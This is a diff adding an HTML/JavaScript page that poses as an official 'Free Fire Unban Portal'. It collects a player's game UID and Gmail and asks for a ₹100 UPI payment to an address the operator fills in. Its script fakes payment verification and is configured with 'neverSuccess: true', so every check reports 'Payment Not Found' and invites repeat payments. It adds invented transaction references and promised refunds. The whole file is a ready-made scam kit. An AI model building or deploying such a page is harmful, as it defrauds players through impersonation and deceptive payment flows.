@@ -1,0 +1,626 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
+<meta name="theme-color" content="#0a0c10" />
+<title>Free Fire Unban Portal | Official</title>
+<style>
+:root{
+  --bg:#0a0c10;
+  --card:#12161d;
+  --card2:#171c25;
+  --line:#242c39;
+  --txt:#e8edf5;
+  --muted:#8b96a8;
+  --orange:#ff7a18;
+  --orange2:#ffb020;
+  --green:#22c55e;
+  --red:#ef4444;
+  --radius:16px;
+}
+*{box-sizing:border-box;-webkit-tap-highlight-color:transparent}
+html,body{margin:0;padding:0}
+body{
+  font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,"Helvetica Neue",Arial,sans-serif;
+  background:var(--bg);
+  background-image:
+    radial-gradient(900px 420px at 50% -140px, rgba(255,122,24,.20), transparent 70%),
+    radial-gradient(700px 320px at 95% 5%, rgba(255,176,32,.07), transparent 70%);
+  background-attachment:fixed;
+  color:var(--txt);
+  min-height:100vh;
+  display:flex;
+  flex-direction:column;
+  align-items:center;
+  padding:14px 14px 40px;
+}
+.wrap{width:100%;max-width:430px}
+
+/* ---------- TOP BAR ---------- */
+.topbar{
+  display:flex;align-items:center;gap:10px;
+  padding:10px 12px;
+  background:linear-gradient(180deg,#161b24,#11151c);
+  border:1px solid var(--line);
+  border-radius:14px;
+  margin-bottom:14px;
+}
+.logo{
+  width:38px;height:38px;border-radius:11px;flex:0 0 38px;
+  background:linear-gradient(145deg,var(--orange2),var(--orange));
+  display:flex;align-items:center;justify-content:center;
+  font-weight:900;font-size:15px;color:#1a0f00;letter-spacing:-.5px;
+  box-shadow:0 0 18px rgba(255,122,24,.35);
+}
+.topbar .t1{font-size:14px;font-weight:800;letter-spacing:.2px;line-height:1.2}
+.topbar .t2{font-size:10.5px;color:var(--muted);letter-spacing:.6px;text-transform:uppercase;margin-top:2px}
+.status{
+  margin-left:auto;font-size:10px;font-weight:700;color:var(--green);
+  display:flex;align-items:center;gap:5px;letter-spacing:.4px;
+  background:rgba(34,197,94,.09);border:1px solid rgba(34,197,94,.25);
+  padding:5px 8px;border-radius:20px;white-space:nowrap;
+}
+.dot{width:6px;height:6px;border-radius:50%;background:var(--green);animation:pulse 1.6s infinite}
+@keyframes pulse{0%,100%{opacity:1;transform:scale(1)}50%{opacity:.35;transform:scale(.8)}}
+
+/* ---------- STEPS ---------- */
+.steps{display:flex;align-items:center;gap:6px;margin:0 4px 14px}
+.step{display:flex;align-items:center;gap:7px;font-size:11px;color:var(--muted);font-weight:600}
+.step b{
+  width:19px;height:19px;border-radius:50%;font-size:10px;
+  display:flex;align-items:center;justify-content:center;
+  background:#1c222c;border:1px solid var(--line);color:var(--muted);
+}
+.step.active{color:var(--txt)}
+.step.active b{background:linear-gradient(145deg,var(--orange2),var(--orange));color:#1a0f00;border-color:transparent;box-shadow:0 0 12px rgba(255,122,24,.4)}
+.step.done b{background:rgba(34,197,94,.15);border-color:rgba(34,197,94,.4);color:var(--green)}
+.step-line{flex:1;height:1px;background:var(--line)}
+
+/* ---------- CARD ---------- */
+.card{
+  background:linear-gradient(180deg,var(--card2),var(--card));
+  border:1px solid var(--line);
+  border-radius:var(--radius);
+  padding:18px 16px;
+  box-shadow:0 18px 40px rgba(0,0,0,.45);
+}
+.screen{display:none;animation:fade .32s ease}
+.screen.on{display:block}
+@keyframes fade{from{opacity:0;transform:translateY(8px)}to{opacity:1;transform:none}}
+
+.head{text-align:center;margin-bottom:18px}
+.head h1{font-size:18px;margin:0 0 6px;font-weight:800;letter-spacing:.2px}
+.head p{font-size:12px;color:var(--muted);margin:0;line-height:1.55}
+.badge{
+  display:inline-block;font-size:10px;font-weight:800;letter-spacing:.7px;
+  color:var(--orange2);background:rgba(255,122,24,.10);
+  border:1px solid rgba(255,122,24,.28);
+  padding:4px 10px;border-radius:20px;margin-bottom:10px;text-transform:uppercase;
+}
+
+/* ---------- FORM ---------- */
+.field{margin-bottom:14px}
+.field label{display:block;font-size:11px;font-weight:700;letter-spacing:.6px;text-transform:uppercase;color:var(--muted);margin-bottom:7px}
+.inputwrap{position:relative}
+.inputwrap span{
+  position:absolute;left:13px;top:50%;transform:translateY(-50%);
+  font-size:13px;color:var(--muted);pointer-events:none;
+}
+input{
+  width:100%;padding:14px 14px;
+  background:#0d1117;border:1px solid var(--line);border-radius:12px;
+  color:var(--txt);font-size:15px;outline:none;
+  transition:border-color .2s,box-shadow .2s;
+  font-family:inherit;
+}
+input:focus{border-color:var(--orange);box-shadow:0 0 0 3px rgba(255,122,24,.14)}
+input.err{border-color:var(--red);box-shadow:0 0 0 3px rgba(239,68,68,.12)}
+.hint{font-size:10.5px;color:#6b7686;margin-top:6px;line-height:1.5}
+.errmsg{font-size:11px;color:var(--red);margin-top:6px;display:none}
+.errmsg.on{display:block}
+
+/* ---------- BUTTONS ---------- */
+.btn{
+  width:100%;padding:15px;border:none;border-radius:12px;
+  font-size:14px;font-weight:800;letter-spacing:.7px;text-transform:uppercase;
+  color:#1a0f00;cursor:pointer;font-family:inherit;
+  background:linear-gradient(145deg,var(--orange2),var(--orange));
+  box-shadow:0 8px 22px rgba(255,122,24,.28);
+  transition:transform .12s,box-shadow .2s,opacity .2s;
+}
+.btn:active{transform:scale(.975);box-shadow:0 4px 14px rgba(255,122,24,.22)}
+.btn.ghost{
+  background:transparent;color:var(--txt);
+  border:1px solid var(--line);box-shadow:none;
+}
+.btn.ghost:active{background:#1b2129}
+.btn:disabled{opacity:.55;cursor:not-allowed}
+.btn-row{display:flex;gap:10px;margin-top:12px}
+.btn-row .btn{margin-top:0}
+
+/* ---------- PAYMENT ---------- */
+.amount-box{
+  text-align:center;padding:14px;border-radius:14px;
+  background:linear-gradient(180deg,rgba(255,122,24,.10),rgba(255,122,24,.03));
+  border:1px solid rgba(255,122,24,.25);margin-bottom:16px;
+}
+.amount-box .lbl{font-size:10.5px;letter-spacing:1px;text-transform:uppercase;color:var(--muted);font-weight:700}
+.amount-box .amt{font-size:30px;font-weight:900;margin:4px 0 2px;color:var(--orange2);letter-spacing:-1px}
+.amount-box .sub{font-size:11px;color:var(--muted)}
+
+.qr-frame{
+  position:relative;width:100%;aspect-ratio:1/1;max-width:250px;margin:0 auto 12px;
+  background:#fff;border-radius:14px;padding:11px;
+  box-shadow:0 12px 34px rgba(0,0,0,.5);
+}
+.qr-frame img{width:100%;height:100%;object-fit:contain;display:block;border-radius:6px}
+.qr-cap{text-align:center;font-size:11px;color:var(--muted);margin-bottom:14px;line-height:1.6}
+.qr-cap b{color:var(--txt)}
+
+.note{
+  display:flex;gap:9px;align-items:flex-start;
+  background:rgba(34,197,94,.07);border:1px solid rgba(34,197,94,.22);
+  border-radius:12px;padding:11px 12px;margin-bottom:14px;
+}
+.note .ic{font-size:14px;line-height:1.3}
+.note p{margin:0;font-size:11.5px;line-height:1.6;color:#b8c4d4}
+.note b{color:var(--green)}
+
+.details{border:1px dashed var(--line);border-radius:12px;overflow:hidden;margin-bottom:16px}
+.row{display:flex;justify-content:space-between;gap:10px;padding:9px 12px;font-size:12px;border-bottom:1px solid rgba(36,44,57,.6)}
+.row:last-child{border-bottom:none}
+.row .k{color:var(--muted)}
+.row .v{font-weight:700;text-align:right;word-break:break-all}
+.v.pending{color:var(--orange2)}
+.v.green{color:var(--green)}
+
+.timer{
+  text-align:center;font-size:11.5px;color:var(--muted);margin-bottom:12px;
+  font-variant-numeric:tabular-nums;
+}
+.timer b{color:var(--orange2);font-weight:800}
+
+/* ---------- LOADER ---------- */
+.loader{
+  position:fixed;inset:0;z-index:60;
+  background:rgba(6,8,12,.88);backdrop-filter:blur(6px);
+  display:none;flex-direction:column;align-items:center;justify-content:center;gap:18px;
+  padding:24px;text-align:center;
+}
+.loader.on{display:flex;animation:fade .2s ease}
+.spinner{width:52px;height:52px;border-radius:50%;border:3px solid rgba(255,122,24,.18);border-top-color:var(--orange);animation:spin .8s linear infinite}
+@keyframes spin{to{transform:rotate(360deg)}}
+.loader .lt{font-size:13px;font-weight:700;letter-spacing:.3px}
+.loader .ls{font-size:11.5px;color:var(--muted);min-height:17px}
+.bar{width:210px;height:4px;border-radius:4px;background:#1c222c;overflow:hidden}
+.bar i{display:block;height:100%;width:0;background:linear-gradient(90deg,var(--orange),var(--orange2));animation:load 2s linear forwards}
+@keyframes load{to{width:100%}}
+
+/* ---------- RESULT ---------- */
+.result{text-align:center;padding:6px 0 2px}
+.r-icon{
+  width:66px;height:66px;border-radius:50%;margin:0 auto 14px;
+  display:flex;align-items:center;justify-content:center;font-size:30px;
+  background:rgba(239,68,68,.10);border:2px solid rgba(239,68,68,.35);
+  animation:pop .4s cubic-bezier(.2,1.4,.5,1);
+}
+@keyframes pop{from{transform:scale(.5);opacity:0}to{transform:scale(1);opacity:1}}
+.result h2{font-size:17px;margin:0 0 8px;color:var(--red);letter-spacing:.5px;font-weight:900}
+.result p{font-size:12.5px;color:#b8c4d4;line-height:1.65;margin:0 0 8px}
+.result .small{font-size:11px;color:var(--muted)}
+.attempts{font-size:10.5px;color:#6b7686;margin-top:10px}
+
+/* ---------- TOAST ---------- */
+.toast{
+  position:fixed;left:50%;bottom:22px;transform:translate(-50%,120%);
+  background:#1b2129;border:1px solid var(--line);color:var(--txt);
+  padding:11px 16px;border-radius:30px;font-size:12px;font-weight:600;
+  box-shadow:0 12px 30px rgba(0,0,0,.5);z-index:80;
+  transition:transform .35s cubic-bezier(.2,1.2,.4,1);max-width:92vw;text-align:center;
+}
+.toast.on{transform:translate(-50%,0)}
+
+.footer{text-align:center;font-size:10px;color:#5c6675;margin-top:16px;line-height:1.7}
+.footer b{color:#7d8797}
+</style>
+</head>
+<body>
+
+<div class="wrap">
+
+  <div class="topbar">
+    <div class="logo">FF</div>
+    <div>
+      <div class="t1">Free Fire Unban Portal</div>
+      <div class="t2">Official Support Center</div>
+    </div>
+    <div class="status"><span class="dot"></span>SERVER ONLINE</div>
+  </div>
+
+  <div class="steps">
+    <div class="step active" id="step1"><b>1</b> ACCOUNT</div>
+    <div class="step-line"></div>
+    <div class="step" id="step2"><b>2</b> PAYMENT</div>
+  </div>
+
+  <!-- ============ SCREEN 1 : UID + GMAIL ============ -->
+  <div class="screen on" id="screenAccount">
+    <div class="card">
+      <div class="head">
+        <div class="badge">Step 1 of 2</div>
+        <h1>Account Verification</h1>
+        <p>Enter your Free Fire <b>UID</b> and registered <b>Gmail</b> to start the unban request.</p>
+      </div>
+
+      <form id="accountForm" novalidate>
+        <div class="field">
+          <label for="uid">Free Fire UID</label>
+          <div class="inputwrap">
+            <input id="uid" type="text" inputmode="numeric" autocomplete="off"
+                   placeholder="Enter your 8–12 digit UID" maxlength="12" />
+          </div>
+          <div class="hint">Find it in Free Fire → Profile → tap your name.</div>
+          <div class="errmsg" id="uidErr">Please enter a valid UID (8–12 digits).</div>
+        </div>
+
+        <div class="field">
+          <label for="email">Registered Gmail</label>
+          <div class="inputwrap">
+            <input id="email" type="email" inputmode="email" autocomplete="off"
+                   placeholder="yourname@gmail.com" />
+          </div>
+          <div class="hint">The Gmail linked to your Free Fire account.</div>
+          <div class="errmsg" id="emailErr">Please enter a valid email address.</div>
+        </div>
+
+        <button class="btn" type="submit" id="enterBtn">ENTER</button>
+      </form>
+
+      <div class="footer">
+        Secure verification · Takes less than 60 seconds<br>
+        <b>Unban Fee:</b> ₹100 (one time, non-refundable)
+      </div>
+    </div>
+  </div>
+
+  <!-- ============ SCREEN 2 : PAYMENT / QR ============ -->
+  <div class="screen" id="screenPay">
+    <div class="card">
+      <div class="head">
+        <div class="badge">Step 2 of 2</div>
+        <h1>Complete Payment</h1>
+        <p>Scan the QR below and pay <b>₹100</b> to unlock your account.</p>
+      </div>
+
+      <div class="amount-box">
+        <div class="lbl">Total Payable</div>
+        <div class="amt">₹100</div>
+        <div class="sub">Unban Processing Fee</div>
+      </div>
+
+      <div class="qr-frame">
+        <img id="qrImg" alt="Scan to pay ₹100" />
+      </div>
+      <div class="qr-cap">
+        Scan with <b>GPay / PhonePe / Paytm / BHIM</b><br>
+        UPI ID: <b id="upiText">—</b>
+      </div>
+
+      <div class="note">
+        <div class="ic">✅</div>
+        <p><b>Payment will be automatically verified.</b><br>
+        Pay the amount, then come back to this page and tap
+        <b>CHECK PAYMENT</b>.</p>
+      </div>
+
+      <div class="details">
+        <div class="row"><span class="k">Order ID</span><span class="v" id="dOrder">—</span></div>
+        <div class="row"><span class="k">Free Fire UID</span><span class="v" id="dUid">—</span></div>
+        <div class="row"><span class="k">Gmail</span><span class="v" id="dEmail">—</span></div>
+        <div class="row"><span class="k">Amount</span><span class="v">₹100.00</span></div>
+        <div class="row"><span class="k">Status</span><span class="v pending" id="dStatus">AWAITING PAYMENT</span></div>
+      </div>
+
+      <div class="timer">Verification window closes in <b id="timer">05:00</b></div>
+
+      <button class="btn" id="checkBtn">CHECK PAYMENT</button>
+      <button class="btn ghost" id="backBtn" style="margin-top:10px">EDIT UID / GMAIL</button>
+    </div>
+  </div>
+
+  <!-- ============ SCREEN 3 : RESULT ============ -->
+  <div class="screen" id="screenResult">
+    <div class="card">
+      <div class="result">
+        <div class="r-icon" id="rIcon">✖</div>
+        <h2 id="rTitle">PAYMENT NOT FOUND</h2>
+        <p id="rMsg">No successful transaction of <b>₹100</b> was found against your UID.</p>
+        <p class="small" id="rSub">If you have already paid, please wait 5–10 minutes and tap check payment again.</p>
+        <div class="attempts" id="rAttempts">Verification attempt #1</div>
+      </div>
+
+      <div class="details" style="margin-top:16px">
+        <div class="row"><span class="k">Order ID</span><span class="v" id="rOrder">—</span></div>
+        <div class="row"><span class="k">UID</span><span class="v" id="rUid">—</span></div>
+        <div class="row"><span class="k">Amount Paid</span><span class="v">₹100.00</span></div>
+        <div class="row"><span class="k">Gateway Ref</span><span class="v" id="rRef">—</span></div>
+      </div>
+
+      <button class="btn" id="retryBtn">CHECK PAYMENT AGAIN</button>
+      <div class="btn-row">
+        <button class="btn ghost" id="startOverBtn">START OVER</button>
+      </div>
+
+      <div class="footer">
+        Refunds are credited within 24–48 working hours.<br>
+        <b>Support:</b> support@ffunban.in
+      </div>
+    </div>
+  </div>
+
+</div>
+
+<!-- ============ LOADER ============ -->
+<div class="loader" id="loader">
+  <div class="spinner"></div>
+  <div class="lt">Verifying Payment</div>
+  <div class="ls" id="loadMsg">Connecting to payment gateway…</div>
+  <div class="bar"><i></i></div>
+</div>
+
+<div class="toast" id="toast"></div>
+
+<script>
+/* =======================================================================
+   CONFIG  —  change these values only
+   ======================================================================= */
+const CONFIG = {
+  amount:        100,                                  // amount in ₹
+  upiId:         "yourname@upi",                       // <-- YOUR UPI ID
+  payeeName:     "FF Unban Service",
+  qrLocal:       "qr-code/qr.png",                     // your QR file in /qr-code folder
+  qrApiFallback: true,                                 // auto-generate QR if local file missing
+  qrApiBase:     "https://api.qrserver.com/v1/create-qr-code/?size=700x700&margin=0&data=",
+  verifyDelayMs: 2000,                                 // fake loading time (2 sec)
+  neverSuccess:  true                                  // always show "Payment Not Found"
+};
+
+/* =======================================================================
+   ELEMENTS
+   ======================================================================= */
+const $ = id => document.getElementById(id);
+const screens = { acc: $("screenAccount"), pay: $("screenPay"), res: $("screenResult") };
+const state = { uid:"", email:"", order:"", ref:"", attempts:0, timerId:null };
+
+/* =======================================================================
+   NAVIGATION
+   ======================================================================= */
+function show(name){
+  Object.values(screens).forEach(s => s.classList.remove("on"));
+  screens[name].classList.add("on");
+  window.scrollTo({ top:0, behavior:"smooth" });
+  $("step1").className = "step" + (name === "acc" ? " active" : " done");
+  $("step2").className = "step" + (name === "pay" ? " active" : name === "res" ? " done" : "");
+}
+function toast(msg, ms = 3200){
+  const t = $("toast");
+  t.textContent = msg;
+  t.classList.add("on");
+  clearTimeout(t._x);
+  t._x = setTimeout(() => t.classList.remove("on"), ms);
+}
+
+/* =======================================================================
+   QR CODE  (local file first, API fallback)
+   ======================================================================= */
+function buildUpiString(){
+  const p = new URLSearchParams({
+    pa: CONFIG.upiId,
+    pn: CONFIG.payeeName,
+    am: CONFIG.amount.toFixed(2),
+    cu: "INR",
+    tn: "FF Unban " + state.order
+  });
+  return "upi://pay?" + p.toString();
+}
+function loadQR(){
+  const img = $("qrImg");
+  img.onerror = function(){
+    if (CONFIG.qrApiFallback){
+      img.onerror = null;
+      img.src = CONFIG.qrApiBase + encodeURIComponent(buildUpiString());
+    }
+  };
+  img.src = CONFIG.qrLocal;
+  $("upiText").textContent = CONFIG.upiId;
+}
+
+/* =======================================================================
+   ORDER ID
+   ======================================================================= */
+function makeOrder(){
+  const d = new Date();
+  const stamp = String(d.getFullYear()).slice(2) +
+    String(d.getMonth()+1).padStart(2,"0") +
+    String(d.getDate()).padStart(2,"0");
+  const rand = Math.random().toString(36).slice(2,8).toUpperCase();
+  return "FFUN" + stamp + rand;
+}
+function makeRef(){
+  return "TXN" + Math.floor(100000000 + Math.random()*899999999);
+}
+
+/* =======================================================================
+   TIMER (5:00 countdown, cosmetic)
+   ======================================================================= */
+function startTimer(){
+  clearInterval(state.timerId);
+  let left = 300;
+  const tick = () => {
+    const m = String(Math.floor(left/60)).padStart(2,"0");
+    const s = String(left%60).padStart(2,"0");
+    $("timer").textContent = m + ":" + s;
+    if (left-- <= 0) { clearInterval(state.timerId); $("timer").textContent = "00:00"; }
+  };
+  tick();
+  state.timerId = setInterval(tick, 1000);
+}
+
+/* =======================================================================
+   STEP 1 — SUBMIT
+   ======================================================================= */
+$("accountForm").addEventListener("submit", e => {
+  e.preventDefault();
+  const uidEl = $("uid"), emEl = $("email");
+  const uid = uidEl.value.trim();
+  const email = emEl.value.trim();
+
+  uidEl.classList.remove("err"); $("uidErr").classList.remove("on");
+  emEl.classList.remove("err");  $("emailErr").classList.remove("on");
+
+  let bad = false;
+  if (!/^[0-9]{8,12}$/.test(uid)) { uidEl.classList.add("err"); $("uidErr").classList.add("on"); bad = true; }
+  if (!/^[^\s@]+@[^\s@]+\.[^\s@]{2,}$/.test(email)) { emEl.classList.add("err"); $("emailErr").classList.add("on"); bad = true; }
+  if (bad) return;
+
+  state.uid = uid;
+  state.email = email;
+  state.order = makeOrder();
+  state.ref = makeRef();
+  state.attempts = 0;
+
+  $("dOrder").textContent = state.order;
+  $("dUid").textContent = uid;
+  $("dEmail").textContent = email;
+  $("dStatus").textContent = "AWAITING PAYMENT";
+  $("dStatus").className = "v pending";
+
+  save();
+  loadQR();
+  startTimer();
+  show("pay");
+  toast("Account found. Complete the payment to proceed.");
+});
+
+/* =======================================================================
+   STEP 2 — CHECK PAYMENT  (2 sec fake loading -> Payment Not Found)
+   ======================================================================= */
+const LOAD_MSGS = [
+  "Connecting to payment gateway…",
+  "Fetching transaction records…",
+  "Matching records with UID " ,
+  "Verifying with bank server…"
+];
+
+$("checkBtn").addEventListener("click", runCheck);
+
+function runCheck(){
+  if (!state.uid) { show("acc"); return; }
+  state.attempts++;
+
+  const loader = $("loader");
+  const msg = $("loadMsg");
+  msg.textContent = LOAD_MSGS[0];
+  loader.classList.add("on");
+
+  // restart the progress bar animation
+  const bar = document.querySelector(".bar i");
+  bar.style.animation = "none";
+  void bar.offsetWidth;
+  bar.style.animation = "load " + (CONFIG.verifyDelayMs/1000) + "s linear forwards";
+
+  let i = 1;
+  const iv = setInterval(() => {
+    msg.textContent = LOAD_MSGS[i].includes("UID")
+      ? LOAD_MSGS[i] + state.uid
+      : LOAD_MSGS[i];
+    i++;
+    if (i >= LOAD_MSGS.length) clearInterval(iv);
+  }, Math.floor(CONFIG.verifyDelayMs / LOAD_MSGS.length));
+
+  setTimeout(() => {
+    clearInterval(iv);
+    loader.classList.remove("on");
+    showResult();
+  }, CONFIG.verifyDelayMs);
+}
+
+function showResult(){
+  const first = state.attempts === 1;
+
+  $("rTitle").textContent = "PAYMENT NOT FOUND";
+  $("rMsg").innerHTML = "No successful transaction of <b>₹100</b> was found against your UID <b>" +
+    state.uid + "</b>.";
+  $("rSub").textContent = first
+    ? "If you have already paid, please wait 5–10 minutes and tap check payment again."
+    : "Your transaction is still not reflected in the gateway records. Try again after a few minutes.";
+
+  $("rOrder").textContent = state.order;
+  $("rUid").textContent = state.uid;
+  $("rRef").textContent = state.ref;
+  $("rAttempts").textContent = "Verification attempt #" + state.attempts +
+    " · " + new Date().toLocaleTimeString();
+
+  $("dStatus").textContent = "NOT VERIFIED";
+  $("dStatus").className = "v";
+
+  show("res");
+}
+
+/* =======================================================================
+   BUTTONS
+   ======================================================================= */
+$("retryBtn").addEventListener("click", () => {
+  state.ref = makeRef();
+  show("pay");
+  setTimeout(runCheck, 120);
+});
+$("startOverBtn").addEventListener("click", () => {
+  localStorage.removeItem("ffUnbanState");
+  state.uid = state.email = state.order = "";
+  $("uid").value = ""; $("email").value = "";
+  show("acc");
+});
+$("backBtn").addEventListener("click", () => show("acc"));
+
+/* =======================================================================
+   "CAME BACK TO THE PAGE" DETECTION
+   ======================================================================= */
+let leftPage = false;
+document.addEventListener("visibilitychange", () => {
+  if (document.hidden) { leftPage = true; }
+  else if (leftPage && screens.pay.classList.contains("on")) {
+    leftPage = false;
+    toast("Welcome back — tap CHECK PAYMENT to verify.");
+  }
+});
+
+/* =======================================================================
+   STATE PERSISTENCE (survives refresh)
+   ======================================================================= */
+function save(){
+  try {
+    localStorage.setItem("ffUnbanState", JSON.stringify({
+      uid: state.uid, email: state.email, order: state.order, ref: state.ref
+    }));
+  } catch(e){}
+}
+(function restore(){
+  try {
+    const s = JSON.parse(localStorage.getItem("ffUnbanState") || "null");
+    if (s && s.uid){
+      Object.assign(state, s);
+      $("dOrder").textContent = s.order;
+      $("dUid").textContent = s.uid;
+      $("dEmail").textContent = s.email;
+      loadQR(); startTimer(); show("pay");
+    }
+  } catch(e){}
+})();
+
+/* prevent double-tap zoom on iOS */
+document.addEventListener("dblclick", () => {}, { passive:true });
+</script>
+</body>
+</html>
